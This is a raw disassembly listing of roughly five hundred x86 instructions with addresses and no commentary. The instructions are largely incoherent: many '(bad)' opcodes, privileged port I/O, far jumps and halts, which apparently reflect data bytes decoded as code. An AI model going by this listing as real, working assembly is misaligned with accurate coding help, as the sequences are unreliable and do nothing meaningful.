  42bdbe:	test   BYTE PTR [esi+edi*8-0x41],dh
  42bdc2:	call   0x6e1f3f2a
  42bdc7:	int3   
  42bdc8:	jmp    0x3b9:0x8d7c61c3
  42bdcf:	ror    DWORD PTR [esi+0x2d],1
  42bdd2:	dec    edi
  42bdd3:	jno    0x42bdb6
  42bdd5:	mov    ds:0x277fa07f,al
  42bdda:	xchg   BYTE PTR [edi],bh
  42bddc:	shr    BYTE PTR [eax],1
  42bdde:	inc    esp
  42bddf:	jb     0x42bdce
  42bde1:	int    0xeb
  42bde3:	adc    bl,BYTE PTR [esi+0x4b754655]
  42bde9:	mov    edi,0x760f4f17
  42bdee:	rcr    DWORD PTR [bx+di+0x221b],1
  42bdf3:	or     eax,ebx
  42bdf5:	shr    BYTE PTR [edi+0x79d1ddeb],1
  42bdfb:	sub    ah,BYTE PTR [esi+0x3c]
  42bdfe:	cwde   
  42bdff:	sbb    BYTE PTR [ebp-0x5d],al
  42be02:	sub    DWORD PTR [ecx+0x5e87f7f5],eax
  42be08:	pop    ebp
  42be09:	sbb    esp,DWORD PTR [ecx]
  42be0b:	(bad)  
  42be0c:	adc    eax,0x6d84084b
  42be11:	add    eax,eax
  42be13:	out    0x1a,eax
  42be15:	stos   DWORD PTR es:[edi],eax
  42be16:	inc    ebp
  42be17:	mov    al,ds:0x676d76fa
  42be1c:	ja     0x42bdc9
  42be1e:	mov    ebp,DWORD PTR [edx-0x71]
  42be21:	and    eax,0xe8e9bebf
  42be26:	xchg   ecx,eax
  42be27:	push   eax
  42be28:	push   ss
  42be29:	and    eax,0x10479e07
  42be2e:	test   al,0x69
  42be30:	fld    TBYTE PTR [ebp+ebx*1-0x55ad6111]
  42be37:	fadd   st,st(3)
  42be39:	add    BYTE PTR [ebp+edi*2+0x39e9a110],0xd9
  42be41:	pop    ebx
  42be42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be43:	ins    BYTE PTR es:[edi],dx
  42be44:	(bad)  
  42be46:	mov    eax,ds:0x3e5eb359
  42be4b:	xor    eax,0x72dbf126
  42be50:	popf   
  42be51:	xchg   DWORD PTR [esi-0x41],ebp
  42be54:	mov    ah,0xb5
  42be56:	es xchg ecx,eax
  42be58:	test   eax,0xde55aeda
  42be5d:	pop    ebx
  42be5e:	mov    ds:0x531dcd80,al
  42be63:	jo     0x42be6c
  42be65:	or     dh,ch
  42be67:	jb     0x42bea2
  42be69:	shl    BYTE PTR [ebx+0x4fee5af0],0x4c
  42be70:	addr16 push esi
  42be72:	std    
  42be73:	push   eax
  42be74:	adc    DWORD PTR [ecx-0x2f],esp
  42be77:	sbb    bh,al
  42be79:	push   ecx
  42be7a:	cmovp  esp,DWORD PTR [edx-0x16]
  42be7e:	xchg   esp,eax
  42be7f:	stos   BYTE PTR es:[edi],al
  42be80:	pop    ds
  42be81:	push   ss
  42be82:	mov    ah,0x2
  42be84:	cmp    DWORD PTR [edi],eax
  42be86:	or     al,0xf2
  42be88:	mov    dl,0xc
  42be8a:	push   edi
  42be8b:	call   0xb4b08732
  42be90:	pop    esp
  42be91:	fwait
  42be92:	inc    eax
  42be93:	jmp    0x42be7c
  42be95:	mov    ds:0x760e638a,eax
  42be9a:	push   cs
  42be9b:	stc    
  42be9c:	mov    dh,0xa2
  42be9e:	xor    cx,cx
  42bea1:	mov    ebx,0x40b10af1
  42bea6:	adc    esi,DWORD PTR [eax+0x4598884c]
  42beac:	les    eax,FWORD PTR [eax+0x74]
  42beaf:	inc    ebx
  42beb0:	push   0x599addda
  42beb5:	leave  
  42beb6:	outs   dx,BYTE PTR ds:[esi]
  42beb7:	das    
  42beb8:	or     eax,0x2850e1a9
  42bebd:	outs   dx,BYTE PTR ds:[esi]
  42bebe:	rol    BYTE PTR [edx+0x672dc3af],0x3c
  42bec5:	daa    
  42bec6:	sub    eax,0xa4d3f1a5
  42becb:	add    al,0x24
  42becd:	aad    0x4a
  42becf:	push   esi
  42bed0:	pop    ss
  42bed1:	ret    
  42bed2:	hlt    
  42bed3:	add    DWORD PTR [edx-0x4ed59db8],ebp
  42bed9:	mov    ?,WORD PTR [eax]
  42bedb:	pop    ds
  42bedc:	mov    dl,0xca
  42bede:	inc    esi
  42bedf:	scas   al,BYTE PTR es:[edi]
  42bee0:	mov    ch,0x61
  42bee2:	inc    esi
  42bee3:	rcl    esi,1
  42bee5:	dec    edx
  42bee6:	add    eax,0xdaf9cfc0
  42beeb:	daa    
  42beec:	aas    
  42beed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42beee:	scas   eax,DWORD PTR es:[edi]
  42beef:	pop    esp
  42bef0:	fldln2 
  42bef2:	mov    esp,0x47e3d447
  42bef7:	mov    ch,0xff
  42bef9:	test   eax,0x612dc0db
  42befe:	sahf   
  42beff:	push   0xffffffd0
  42bf01:	ja     0x42bea3
  42bf03:	in     eax,dx
  42bf04:	hlt    
  42bf05:	adc    eax,0x1653f6d7
  42bf0a:	dec    ecx
  42bf0b:	(bad)  
  42bf0c:	hlt    
  42bf0d:	mov    eax,0x59ee8074
  42bf12:	cmp    ch,BYTE PTR [ebp+0x632aca17]
  42bf18:	popa   
  42bf19:	jne    0x42bea6
  42bf1b:	hlt    
  42bf1c:	std    
  42bf1d:	mov    WORD PTR [esi],es
  42bf1f:	sub    eax,DWORD PTR [edi-0x33]
  42bf22:	popa   
  42bf23:	outs   dx,BYTE PTR ds:[esi]
  42bf24:	xchg   edi,eax
  42bf25:	pop    eax
  42bf26:	adc    DWORD PTR [ebx-0x6d],0x31d1d5b4
  42bf2d:	xor    al,0xf4
  42bf2f:	mov    dh,0xe0
  42bf31:	mov    ebx,0x8ca6b8e6
  42bf36:	dec    esp
  42bf37:	mov    ecx,0x17cf96a
  42bf3c:	inc    esi
  42bf3d:	shl    BYTE PTR ds:0x5bb0a68e,0x51
  42bf44:	loopne 0x42bfb7
  42bf46:	or     BYTE PTR [ebx+edi*1-0x5ae6668e],cl
  42bf4d:	xlat   BYTE PTR ds:[ebx]
  42bf4e:	mov    bh,0xff
  42bf50:	ins    DWORD PTR es:[edi],dx
  42bf51:	mov    ch,0x58
  42bf53:	jp     0x42bfcd
  42bf55:	mov    esp,0x28fe511c
  42bf5a:	mov    eax,0x461072b9
  42bf5f:	mov    eax,0x62d749fa
  42bf64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf65:	inc    esi
  42bf66:	cmp    al,0x71
  42bf68:	loopne 0x42bfae
  42bf6a:	nop
  42bf6b:	push   DWORD PTR [eax+0x1e]
  42bf6e:	loope  0x42bfb3
  42bf70:	test   eax,0x17d0ee79
  42bf75:	maxps  xmm4,xmm4
  42bf78:	jae    0x42bfce
  42bf7a:	cli    
  42bf7b:	lods   eax,DWORD PTR ds:[esi]
  42bf7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf7d:	repz xchg ecx,eax
  42bf7f:	and    eax,0x5a108578
  42bf84:	sbb    DWORD PTR [edi],esi
  42bf86:	int    0x4
  42bf88:	jne    0x42bf44
  42bf8a:	fxch   st(3)
  42bf8c:	test   al,0xc3
  42bf8e:	bound  ebx,QWORD PTR [ebp+0x27]
  42bf91:	push   0x9dff5738
  42bf96:	in     eax,0xa9
  42bf98:	fstp   QWORD PTR [esi-0x53]
  42bf9b:	nop
  42bf9c:	cwde   
  42bf9d:	add    al,0xfe
  42bf9f:	push   es
  42bfa0:	popa   
  42bfa1:	(bad)  
  42bfa2:	sti    
  42bfa3:	or     BYTE PTR [edi+0x3059be90],0x24
  42bfaa:	ret    
  42bfab:	ficomp DWORD PTR [esi+0x76d97a49]
  42bfb1:	stos   BYTE PTR es:[edi],al
  42bfb2:	icebp  
  42bfb3:	inc    ebx
  42bfb4:	xchg   esi,eax
  42bfb5:	into   
  42bfb6:	out    dx,eax
  42bfb7:	es dec edx
  42bfb9:	es out 0x4,eax
  42bfbc:	icebp  
  42bfbd:	mov    edx,0xc93df6d5
  42bfc2:	push   esp
  42bfc3:	in     al,0x60
  42bfc5:	mov    eax,0x7e2a412
  42bfca:	rol    DWORD PTR ds:0x31816921,cl
  42bfd0:	shl    DWORD PTR [ecx],0x82
  42bfd3:	sub    eax,0x5a555cdd
  42bfd8:	(bad)  
  42bfd9:	into   
  42bfda:	mov    ebp,0xc7849e4e
  42bfdf:	and    eax,0xfd6c31f6
  42bfe4:	or     DWORD PTR [esi-0x58],ebx
  42bfe7:	fs inc ebx
  42bfe9:	pop    esp
  42bfea:	dec    eax
  42bfeb:	je     0x42c06a
  42bfed:	mov    ds:0x7c731daf,eax
  42bff2:	adc    eax,0xd9103f9c
  42bff7:	xor    DWORD PTR [ecx+edi*4-0x22],ebx
  42bffb:	adc    ah,BYTE PTR [ecx+0x1cea304f]
  42c001:	cdq    
  42c002:	sbb    al,0xb6
  42c004:	xchg   esi,eax
  42c005:	add    BYTE PTR [edi+ebx*8],cl
  42c008:	in     al,dx
  42c009:	rol    DWORD PTR [edi-0x78],1
  42c00c:	ds (bad) 
  42c00e:	sbb    cl,BYTE PTR [eax-0x1801bd9]
  42c014:	xor    DWORD PTR [esp+esi*8+0x37],ebp
  42c018:	in     eax,0x1c
  42c01a:	dec    esp
  42c01b:	xor    dh,BYTE PTR [edi+ebx*4+0x210971e]
  42c022:	addr16 pop ecx
  42c024:	fidiv  DWORD PTR [edx-0x4bf1e98d]
  42c02a:	test   al,0xa0
  42c02c:	repz sub edx,esi
  42c02f:	popf   
  42c030:	cld    
  42c031:	cmovp  edx,DWORD PTR [eax-0x2faa931]
  42c038:	imul   esi,DWORD PTR [edi-0x5187ead6],0x1f
  42c03f:	jns    0x42c0bd
  42c041:	cmp    ebp,DWORD PTR [edx-0x5570022d]
  42c047:	or     ecx,DWORD PTR [esp+ebx*1+0xa5fc657]
  42c04e:	fld    QWORD PTR [edi+0x2e54f75]
  42c054:	pop    eax
  42c055:	add    BYTE PTR [edi-0x36df0bff],ch
  42c05b:	(bad)  
  42c05d:	iret   
  42c05e:	xchg   edx,eax
  42c05f:	ins    BYTE PTR es:[edi],dx
  42c060:	into   
  42c061:	push   es
  42c062:	retf   
  42c063:	test   eax,0xa29c4546
  42c068:	dec    eax
  42c069:	mov    esi,0xb1373fb5
  42c06e:	add    bl,BYTE PTR [ecx+0x63fbf8aa]
  42c074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c075:	jmp    0x97cc:0x33d408af
  42c07c:	mov    BYTE PTR [edx-0x4b],bh
  42c07f:	push   edx
  42c080:	add    eax,0xebce84ce
  42c085:	xchg   edi,eax
  42c086:	push   cs
  42c087:	fs jp  0x42c06b
  42c08a:	mov    gs,WORD PTR [ebx+0x436bcbbb]
  42c090:	xchg   esp,eax
  42c091:	or     al,BYTE PTR [eax-0x16]
  42c094:	inc    esp
  42c095:	imul   ecx,edx,0xd4fac42e
  42c09b:	les    esi,FWORD PTR [eax]
  42c09d:	push   es
  42c09e:	push   ebx
  42c09f:	pop    edx
  42c0a0:	pop    ebx
  42c0a1:	push   edi
  42c0a2:	fstp   DWORD PTR [ecx-0x7b148010]
  42c0a8:	and    ch,BYTE PTR [ebx-0x7dcd159a]
  42c0ae:	fdiv   QWORD PTR [ecx-0x3315f56f]
  42c0b4:	adc    cl,dh
  42c0b6:	lds    eax,FWORD PTR [ebp+0x3bb56f05]
  42c0bc:	sbb    ebp,DWORD PTR [edx]
  42c0be:	dec    edx
  42c0bf:	mov    esi,0x7d2568c5
  42c0c4:	jnp    0x42c11c
  42c0c6:	and    DWORD PTR [ebp-0x4c],esp
  42c0c9:	mov    bh,0x7
  42c0cb:	sub    esi,edi
  42c0cd:	out    0x4f,eax
  42c0cf:	aas    
  42c0d0:	shl    dh,1
  42c0d2:	nop
  42c0d3:	leave  
  42c0d4:	xor    ecx,esp
  42c0d6:	scas   al,BYTE PTR es:[edi]
  42c0d7:	mov    eax,ds:0xf09b06a4
  42c0dc:	or     eax,0x8d779785
  42c0e1:	adc    dh,BYTE PTR [eax-0x14]
  42c0e4:	fwait
  42c0e5:	repz xor DWORD PTR [eax-0x4df0cd21],esp
  42c0ec:	data16 test bl,dh
  42c0ef:	ins    DWORD PTR es:[edi],dx
  42c0f0:	jmp    0x898f5f62
  42c0f5:	(bad)  
  42c0f6:	jbe    0x42c095
  42c0f8:	and    edi,DWORD PTR [ecx-0x38]
  42c0fb:	cmp    edx,DWORD PTR [esp+eax*2-0x6709e206]
  42c102:	adc    eax,0xd6c19f5f
  42c107:	xchg   bl,dl
  42c109:	mov    eax,ds:0x684b709b
  42c10e:	jle    0x42c0a8
  42c110:	pop    edi
  42c111:	inc    ebx
  42c112:	xchg   edx,eax
  42c113:	jmp    0x42c0fa
  42c115:	test   al,0x35
  42c117:	repnz xchg edi,eax
  42c119:	and    BYTE PTR [ebp+0x13216212],0xf4
  42c120:	push   ss
  42c121:	inc    edi
  42c122:	fsub   st(1),st
  42c124:	js     0x42c0b9
  42c126:	dec    ecx
  42c127:	sbb    BYTE PTR [ecx+0x7552c273],ah
  42c12d:	je     0x42c178
  42c12f:	sub    ah,0x8d
  42c132:	and    BYTE PTR [ebx-0x69],ch
  42c135:	fs lahf 
  42c137:	push   ss
  42c138:	popf   
  42c139:	pop    es
  42c13a:	and    ebp,ecx
  42c13c:	in     al,0x53
  42c13e:	dec    ebp
  42c13f:	jl     0x42c0cd
  42c141:	and    al,0x46
  42c143:	mov    ds:0xa88a1b03,eax
  42c148:	(bad)  [ebp-0x52]
  42c14b:	call   0xc35c8a8
  42c150:	pop    ss
  42c151:	retf   
  42c152:	test   BYTE PTR [edi],ah
  42c154:	mov    al,ds:0x78cc0e60
  42c159:	cmc    
  42c15a:	and    edi,edx
  42c15c:	das    
  42c15d:	popf   
  42c15e:	and    BYTE PTR [ebx],0x41
  42c161:	leave  
  42c162:	call   0x7b528d46
  42c167:	xchg   esi,eax
  42c168:	fbld   TBYTE PTR [esi]
  42c16a:	fcom   DWORD PTR [eax]
  42c16c:	pop    ebx
  42c16d:	jl     0x42c13d
  42c16f:	out    0x2e,eax
  42c171:	jnp    0x42c100
  42c173:	push   ds
  42c174:	sbb    DWORD PTR [edx-0x4b20a84c],esp
  42c17a:	pop    eax
  42c17b:	out    0x5b,al
  42c17d:	mov    cl,0xf8
  42c17f:	jg     0x42c117
  42c181:	push   esi
  42c182:	inc    DWORD PTR [edx]
  42c184:	(bad)  
  42c185:	in     al,0x74
  42c187:	(bad)  
  42c188:	stc    
  42c189:	popf   
  42c18a:	mov    esp,0x81a11412
  42c18f:	aas    
  42c190:	stc    
  42c191:	imul   ebx,DWORD PTR [eax],0xffffffc4
  42c194:	sti    
  42c195:	jno    0x42c189
  42c197:	(bad)  
  42c198:	retf   
  42c199:	out    dx,eax
  42c19a:	adc    ebp,eax
  42c19c:	(bad)  
  42c19d:	jecxz  0x42c19d
  42c19f:	shr    ah,1
  42c1a1:	mov    ch,0x42
  42c1a3:	jle    0x42c220
  42c1a5:	test   DWORD PTR [edi+edi*8-0x10],ecx
  42c1a9:	repnz or ecx,DWORD PTR [ecx+0x1180da23]
  42c1b0:	cmp    BYTE PTR [ebp-0x2a],ch
  42c1b3:	jl     0x42c1bd
  42c1b5:	loope  0x42c22f
  42c1b7:	cmp    dh,BYTE PTR [edx+0x8c1c9f1]
  42c1bd:	push   edx
  42c1be:	or     bh,BYTE PTR [ebp+0x4e]
  42c1c1:	adc    ecx,DWORD PTR [edi-0x47]
  42c1c4:	and    DWORD PTR [edx],ecx
  42c1c6:	in     eax,0x6c
  42c1c8:	rol    DWORD PTR [edx+0x686924ab],1
  42c1ce:	aam    0xcf
  42c1d0:	jne    0x42c23e
  42c1d2:	popf   
  42c1d3:	mov    esp,0x1d5230e6
  42c1d8:	fbld   TBYTE PTR [ebx-0xe]
  42c1db:	cmc    
  42c1dc:	hlt    
  42c1dd:	repz cs aas 
  42c1e0:	out    dx,al
  42c1e1:	dec    ebp
  42c1e2:	or     al,0x89
  42c1e4:	fmulp  st(1),st
  42c1e6:	push   ecx
  42c1e7:	repz arpl WORD PTR [esi+ebx*1+0x42196259],bp
  42c1ef:	sbb    ebx,DWORD PTR [ebp+0x56]
  42c1f2:	sbb    bh,BYTE PTR [ebx+0x2b3ff707]
  42c1f8:	lea    ebx,[ebp+0x13]
  42c1fb:	into   
  42c1fc:	rcl    DWORD PTR [edx-0x153c25ef],1
  42c202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c203:	icebp  
  42c204:	arpl   WORD PTR [esi+ebx*8-0x1f],ax
  42c208:	mov    esp,ebx
  42c20a:	movhps QWORD PTR [ebp+0x54],xmm5
  42c20e:	scas   al,BYTE PTR es:[edi]
  42c20f:	add    ebp,DWORD PTR [edi-0x1d]
  42c212:	aas    
  42c213:	pusha  
  42c214:	or     DWORD PTR [esi-0x3d1b74ad],edi
  42c21a:	or     DWORD PTR [edi-0x629a5cc3],ebp
  42c220:	sub    eax,0xfd161af4
  42c225:	out    dx,al
  42c226:	ss mov al,0x52
  42c229:	jg     0x42c201
  42c22b:	mov    ds:0x42e960ee,eax
  42c230:	xchg   BYTE PTR [edx-0x54],bl
  42c233:	mov    WORD PTR [esp+edx*8+0x1e4e56c9],fs
  42c23a:	nop
  42c23b:	jle    0x42c1d2
  42c23d:	mov    bl,0x95
  42c23f:	inc    edx
  42c240:	mov    ah,0x67
  42c242:	push   0xe67bd5f3
  42c247:	ins    BYTE PTR es:[edi],dx
  42c248:	test   al,0xc3
  42c24a:	push   ss
  42c24b:	loop   0x42c205
  42c24d:	sbb    DWORD PTR [edx],edi
  42c24f:	xor    edi,edx
  42c251:	mov    ebx,0x19d4ec1b
  42c256:	clc    
  42c257:	or     DWORD PTR [ebx-0x70],esi
  42c25a:	jne    0x42c286
  42c25c:	push   eax
  42c25d:	sub    cl,BYTE PTR [eax]
  42c25f:	pop    ds
  42c260:	add    al,0xde
  42c262:	loop   0x42c2c2
  42c264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c265:	(bad)  
  42c266:	dec    edi
  42c267:	dec    eax
  42c268:	xor    BYTE PTR [ecx+0x31],ah
  42c26b:	inc    ecx
  42c26c:	fcom   QWORD PTR [ebx+esi*2-0x3f]
  42c270:	mov    bl,0xe8
  42c272:	mov    bh,0xfa
  42c274:	fidiv  WORD PTR [edx+0x53]
  42c277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c278:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c27a:	pusha  
  42c27b:	and    al,0x5a
  42c27d:	test   al,0x48
  42c27f:	jecxz  0x42c23f
  42c281:	xlat   BYTE PTR ds:[ebx]
  42c282:	mov    ds:0x951fc976,al
  42c287:	mov    esi,0x966faeed
  42c28c:	dec    edx
  42c28d:	mov    bl,0xc
  42c28f:	pop    edx
  42c290:	and    ah,BYTE PTR [edi+0x42e41af4]
  42c296:	rcr    DWORD PTR [edx-0x34],1
  42c299:	in     al,dx
  42c29a:	xor    ch,BYTE PTR [ecx-0x42]
  42c29d:	xor    eax,0xf6499aa5
  42c2a2:	xchg   ebp,eax
  42c2a3:	sub    al,0x3c
  42c2a5:	sub    edx,DWORD PTR [ecx]
  42c2a7:	inc    esi
  42c2a8:	in     al,dx
  42c2a9:	(bad)  [ebx]
  42c2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2ac:	sbb    dl,BYTE PTR [bp+0x16f1]
  42c2b1:	mov    bh,0x4d
  42c2b3:	mov    bh,0xe1
  42c2b5:	add    al,0x73
  42c2b7:	jle    0x42c30e
  42c2b9:	out    dx,eax
  42c2ba:	cmp    al,0x11
  42c2bc:	or     ecx,ebx
  42c2be:	jecxz  0x42c321
  42c2c0:	mov    esi,0x14db3280
  42c2c5:	sbb    bl,BYTE PTR ds:0x20e6122f
  42c2cb:	pop    ebp
  42c2cc:	in     al,dx
  42c2cd:	fucomip st,st(0)
  42c2cf:	mov    esp,0x9f0a6e9b
  42c2d4:	mov    WORD PTR [ebx-0x9],gs
  42c2d7:	pusha  
  42c2d8:	pop    ss
  42c2d9:	mov    esi,DWORD PTR [eax-0x6ccafafa]
  42c2df:	scas   al,BYTE PTR es:[edi]
  42c2e0:	pop    esp
  42c2e1:	pusha  
  42c2e2:	and    DWORD PTR [esi+esi*2],ebx
  42c2e5:	idiv   BYTE PTR ds:0x460178d8
  42c2eb:	pop    edx
  42c2ec:	jle    0x42c2ae
  42c2ee:	mov    bh,0x2
  42c2f0:	or     ebp,DWORD PTR [ecx+0x19395987]
  42c2f6:	mov    ah,0x13
  42c2f8:	arpl   WORD PTR [edx-0x60ab450c],si
  42c2fe:	and    al,0x90
  42c300:	test   DWORD PTR [edi-0x11],0x9de8efb3
  42c307:	fisubr DWORD PTR [ebp-0x1ba28ab0]
  42c30d:	js     0x42c307
  42c30f:	sahf   
  42c310:	adc    ebp,DWORD PTR [esi+0x5e99d5a]
  42c316:	arpl   WORD PTR [eax],dx
  42c318:	and    al,0x9c
  42c31a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c31b:	mov    dl,0xc1
  42c31d:	mov    edi,0x9edb437b
  42c322:	fcomp  QWORD PTR [esp+ebx*1-0x40]
  42c326:	jle    0x42c33e
  42c328:	adc    esp,DWORD PTR [edx+esi*2-0x3b]
  42c32c:	mov    ecx,0x7f2a7997
  42c331:	push   0xffffff84
  42c333:	sub    edx,DWORD PTR [eax]
  42c335:	push   eax
  42c336:	test   BYTE PTR [ebx-0x1dabe03e],ah
  42c33c:	ret    0x2c5b
  42c33f:	lds    ebp,FWORD PTR [eax]
  42c341:	pop    ecx
  42c342:	dec    ecx
  42c343:	mov    bh,0xc7
  42c345:	cs mov ebx,0x856fd8e9
  42c34b:	jns    0x42c3c3
  42c34d:	dec    edi
  42c34e:	lds    eax,FWORD PTR [edx]
  42c350:	push   esi
  42c351:	dec    eax
  42c352:	(bad)  [edi]
  42c354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c355:	sub    ah,BYTE PTR [edi+ebx*8-0x3914762e]
  42c35c:	fstp   QWORD PTR [ecx+0x2a]
  42c35f:	adc    eax,0x83de79cc
  42c364:	and    ch,BYTE PTR [edx]
  42c366:	mov    esi,0x6331116d
  42c36b:	push   edx
  42c36c:	mov    dl,0x6
  42c36e:	jo     0x42c34b
  42c370:	imul   edx,DWORD PTR [edi+eax*2-0x74],0x43ebfcf4
  42c378:	jmp    0x42c3c2
  42c37a:	inc    ebp
  42c37b:	ret    
  42c37c:	xor    al,BYTE PTR [esi]
  42c37e:	aas    
  42c37f:	xchg   BYTE PTR [edi],cl
  42c381:	cmp    DWORD PTR [eax-0x21],0x28c54b45
  42c388:	mov    bh,0xf9
  42c38a:	je     0x42c381
  42c38c:	inc    esp
  42c38d:	mov    eax,ds:0xf08cb562
  42c392:	push   ecx
  42c393:	dec    ebx
  42c394:	mov    dh,0xf3
  42c396:	test   BYTE PTR [esi],bl
  42c398:	pushf  
  42c399:	loopne 0x42c37d
  42c39b:	push   esi
  42c39c:	out    0x55,eax
  42c39e:	jg     0x42c418
  42c3a0:	ficomp DWORD PTR [esi-0x5e]
  42c3a3:	and    eax,0x85914e55
  42c3a8:	aad    0x69
  42c3aa:	ja     0x42c39f
  42c3ac:	aaa    
  42c3ad:	popf   
  42c3ae:	std    
  42c3af:	bound  eax,QWORD PTR [eax+0x57]
  42c3b2:	dec    esp
  42c3b3:	add    ah,BYTE PTR [eax+0x5c1b4809]
  42c3b9:	cmp    DWORD PTR [edi-0x5b],ecx
  42c3bc:	fcomp  QWORD PTR [eax+eax*1+0x3b]
  42c3c0:	stos   DWORD PTR es:[edi],eax
  42c3c1:	cmp    al,0xd2
  42c3c3:	int3   
  42c3c4:	push   0x765b7ce3
  42c3c9:	xchg   ecx,eax
  42c3ca:	mov    ds:0x99fa9d99,al
  42c3cf:	out    dx,eax
  42c3d0:	inc    edi
  42c3d1:	hlt    
  42c3d2:	jo     0x42c364
  42c3d4:	add    ah,BYTE PTR [esi+0x57]
  42c3d7:	daa    
  42c3d8:	iret   
  42c3d9:	cmc    
  42c3da:	add    BYTE PTR [ecx+edi*8+0x4e],al
  42c3de:	stos   BYTE PTR es:[edi],al
  42c3df:	adc    bh,BYTE PTR [esi]
  42c3e1:	in     eax,0x9f
  42c3e3:	sub    DWORD PTR [edi-0x281a500b],edi
  42c3e9:	sbb    eax,0x7085dd2
  42c3ee:	mov    bh,0xd8
  42c3f0:	jno    0x42c42d
  42c3f2:	mov    ebx,0x630cca77
  42c3f7:	fild   WORD PTR [eax]
  42c3f9:	scas   al,BYTE PTR es:[edi]
  42c3fa:	push   ds
  42c3fb:	inc    edx
  42c3fc:	in     eax,0x94
  42c3fe:	inc    edi
  42c3ff:	mov    bh,0x76
  42c401:	add    eax,0xeebcd125
  42c406:	add    esi,DWORD PTR [esi+0x78501590]
  42c40c:	stc    
  42c40d:	mov    ah,0x17
  42c40f:	in     eax,0x7
  42c411:	pop    ss
  42c412:	cli    
  42c413:	sbb    DWORD PTR [edi+0x365e7abe],edi
  42c419:	js     0x42c3e1
  42c41b:	sbb    edx,DWORD PTR [ebp+0x3a90a967]
  42c421:	rcl    DWORD PTR [ebx+0x50],cl
  42c424:	ret    0xe7e
  42c427:	push   cs
  42c428:	pusha  
  42c429:	mov    esp,0x5c88f4cc
  42c42e:	fcomp  QWORD PTR [eax-0x767b718d]
  42c434:	test   DWORD PTR ds:0xf0191eb1,ebp
  42c43a:	repnz std 
  42c43c:	jp     0x42c4a7
  42c43e:	jge    0x42c49c
  42c440:	mov    al,0x1
  42c442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c443:	in     al,0x3b
  42c445:	push   edx
  42c446:	lea    edx,ds:0x6ef95982
  42c44c:	js     0x42c3ff
  42c44e:	and    eax,0x2f72e3d
  42c453:	push   es
  42c454:	sub    ebp,DWORD PTR [ebp-0x78]
  42c457:	ror    ch,1
  42c459:	aaa    
  42c45a:	nop
  42c45b:	mov    ch,0xa1
  42c45d:	aam    0x56
  42c45f:	leave  
  42c460:	push   0xaf147e19
  42c465:	aaa    
  42c466:	call   0xec6cd8b3
  42c46b:	(bad)  
  42c46c:	cmp    esi,ebx
  42c46e:	jae    0x42c401
  42c470:	inc    esi
  42c471:	outs   dx,BYTE PTR ds:[esi]
  42c472:	retf   0xede0
  42c475:	ror    ebp,0x71
  42c478:	dec    esp
  42c479:	mov    bl,0xc3
  42c47b:	outs   dx,DWORD PTR ds:[esi]
  42c47c:	xlat   BYTE PTR ds:[ebx]
  42c47d:	sahf   
  42c47e:	mov    bl,0xb1
  42c480:	sti    
  42c481:	pop    ebx
  42c482:	cld    
  42c483:	loopne 0x42c4b2
  42c485:	(bad)  
  42c486:	repnz mov BYTE PTR [esi-0x4],bl
  42c48a:	stos   DWORD PTR es:[edi],eax
  42c48b:	dec    edx
  42c48c:	push   cs
  42c48d:	mov    cl,bl
  42c48f:	js     0x42c4fa
  42c491:	or     BYTE PTR [edi+0xee03ff0],0x29
  42c498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c499:	rol    DWORD PTR [edi],cl
  42c49b:	and    eax,0x9d90227d
  42c4a0:	fbld   TBYTE PTR [esi]
  42c4a2:	lahf   
  42c4a3:	xor    dh,cl
  42c4a5:	jmp    0x9442ef79
  42c4aa:	nop
  42c4ab:	jle    0x42c502
  42c4ad:	daa    
  42c4ae:	jmp    0xd9d3:0x3df1d57d
  42c4b5:	mov    ebp,0x63820f5b
  42c4ba:	jno    0x42c4fe
  42c4bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4bd:	in     al,dx
  42c4be:	push   esi
  42c4bf:	daa    
  42c4c0:	(bad)  
  42c4c1:	and    al,BYTE PTR ds:0x9ed9aa0
  42c4c7:	or     eax,0x44200b0b
  42c4cc:	add    al,0xef
  42c4ce:	mov    ecx,0xdb792d8c
  42c4d3:	push   edx
  42c4d4:	jl     0x42c4a0
  42c4d6:	je     0x42c4c7
  42c4d8:	jmp    FWORD PTR [edi+edx*2-0x6d5a4421]
  42c4df:	add    dh,BYTE PTR [edi+0x25693c24]
  42c4e5:	das    
  42c4e6:	push   edx
  42c4e7:	sbb    bh,BYTE PTR [edx-0x5f]
  42c4ea:	cmp    ah,BYTE PTR ds:0x1b865218
  42c4f0:	stc    
  42c4f1:	mov    ch,0xe5
  42c4f3:	add    eax,0xaff7aba9
  42c4f8:	in     al,dx
  42c4f9:	popf   
  42c4fa:	add    DWORD PTR [esi+0x3ea39b62],eax
  42c500:	push   es
  42c501:	sbb    BYTE PTR [ecx],dl
  42c503:	loopne 0x42c4f5
  42c505:	jmp    0x42c4ed
  42c507:	mov    bl,0x1e
  42c509:	pop    es
  42c50a:	rcl    DWORD PTR [ebx+0x243d6ffd],cl
  42c510:	bound  ecx,QWORD PTR [ecx]
  42c512:	fcom   DWORD PTR ds:0xc4a73dea
  42c518:	imul   ax,WORD PTR [esp+ecx*4],0xfffe
  42c51d:	pop    ss
  42c51e:	clc    
  42c51f:	jge    0x42c4da
  42c521:	hlt    
  42c522:	sub    eax,0x6acfea5b
  42c527:	adc    dh,BYTE PTR [ebx+0x61ac22c9]
  42c52d:	xrelease mov DWORD PTR [ecx*4+0x1d506bc5],ecx
  42c535:	out    dx,eax
  42c536:	add    bl,BYTE PTR [edx+0x63]
  42c539:	adc    al,BYTE PTR [eax+0x257372c5]
  42c53f:	inc    ebx
  42c540:	out    dx,eax
  42c541:	cli    
  42c542:	in     eax,dx
  42c543:	push   ds
  42c544:	inc    edx
  42c545:	xchg   ecx,eax
  42c546:	push   esi
  42c547:	pusha  
  42c548:	loopne 0x42c507
  42c54a:	dec    ah
